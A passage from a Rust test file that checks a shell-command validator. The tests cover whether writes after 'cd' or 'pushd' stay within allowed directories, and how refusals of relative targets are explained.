        validate_command_in_cwd(
            &format!("cd {dir}; echo x > out.txt"),
            &paths,
            Some("/repo"),
            Some("/repo"),
        )
        .is_none(),
        "an existing directory: the `cd` takes effect"
    );
    assert!(
        validate_command_in_cwd(
            &format!("cd {dir}/missing; echo x > out.txt"),
            &paths,
            Some("/repo"),
            Some("/repo"),
        )
        .is_some(),
        "a missing directory: the `cd` fails and the write lands in the project"
    );
}

/// A refused relative target says how it was placed, so the caller knows to
/// give an absolute path; an absolute one does not need the explanation.
#[test]
fn a_refused_relative_target_explains_where_it_was_placed() {
    let paths = vec!["/private/tmp".to_string()];
    let relative = validate_command_in_cwd("pushd /x && echo hi > f", &paths, Some("/repo"), None)
        .expect("refused");
    assert!(relative.contains("its own command runs in"), "{relative}");
    assert!(relative.contains("absolute path"), "{relative}");
    let absolute =
        validate_command_in_cwd("echo hi > /repo/f", &paths, Some("/repo"), Some("/repo"))
            .expect("refused");
    assert!(!absolute.contains("its own command runs in"), "{absolute}");
}
